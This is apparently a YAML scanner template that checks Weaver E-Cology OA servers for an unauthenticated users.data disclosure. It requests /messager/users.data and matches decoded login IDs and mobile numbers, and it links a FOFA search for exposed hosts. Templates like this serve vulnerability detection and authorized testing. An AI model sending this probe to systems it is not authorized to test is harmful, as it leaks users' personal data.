name: poc-yaml-eweaver-ecology-usersdata-disclosure
binding: 62e1ffd7-c7f8-417f-8f0e-526ed6c6525a
manual: true
detail:
    author: 作者123
    links:
        - https://fofa.info/result?qbase64=YXBwPSLms5vlvq4t5Y2P5ZCM5ZWG5Yqh57O757ufIg%3D%3D
        - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20users.data%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F.html
    vulnerability:
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /messager/users.data
            follow_redirects: false
        expression: response.status == 200 && base64Decode(response.body_string).startsWith("<users>") && base64Decode(response.body_string).contains("<loginid>") && base64Decode(response.body_string).contains("</mobile>")
expression: r0()
